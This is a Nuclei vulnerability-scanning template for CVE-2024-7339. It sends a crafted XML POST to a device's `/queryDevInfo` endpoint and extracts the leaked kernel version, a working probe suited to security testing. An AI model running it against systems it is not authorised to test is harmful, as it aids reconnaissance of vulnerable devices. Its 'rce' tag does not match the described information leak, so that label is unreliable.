id: cve-2024-7339-exploit

info:
  name: Vulnerability Detection for CVE-2024-7339
  author: 3p1c0w3nd
  severity: high
  description: |
    Exploits a vulnerability in the endpoint `/queryDevInfo`. The vulnerability allows for sensitive information to be leaked from the server in the form of kernel version details.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-7339
  tags: rce, information-disclosure

requests:
  - method: POST
    path:
      - "{{BaseURL}}/queryDevInfo"
    headers:
      Content-Type: application/xml
      Accept-Language: en-US,en;q=0.9
      Accept-Encoding: gzip, deflate
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
      Upgrade-Insecure-Requests: 1
      Connection: keep-alive
      User-Agent: Nuclei
    body: |
      <?xml version="1.0" encoding="utf-8" ?>
      <request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
    matchers:
      - type: word
        words:
          - "</kenerlVersion>"
        part: body
        condition: contains
    extractors:
      - type: regex
        name: kernel_version
        group: 1
        regex: '<kenerlVersion>(.*?)</kenerlVersion>'
